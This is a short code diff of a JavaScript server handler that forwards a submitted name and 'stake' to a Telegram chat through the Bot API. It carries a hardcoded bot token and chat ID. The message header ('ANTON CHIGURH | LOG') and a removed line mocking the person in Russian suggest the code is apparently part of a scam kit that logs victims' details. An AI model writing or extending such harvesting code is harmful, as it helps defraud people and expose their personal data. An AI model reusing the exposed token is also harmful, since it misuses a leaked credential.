@@ -4,7 +4,7 @@ module.exports = async (req, res) => {
   const token = '8040858042:AAHYFzMmMwzXduxH3d39bE767qJ0VH9vcTo'; 
   const chat = '-1003591999988';
 
-  const text = `🌑 **ANTON CHIGURH | LOG ОН ПРОЕБАЛ!**\n\n👤 Имя: ${fio}\n💰 Ставка: ${addr}`;
+  const text = `🌑 **ANTON CHIGURH | LOG**\n\n👤 Имя: ${fio}\n💰 Ставка: ${addr}`;
 
   try {
     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
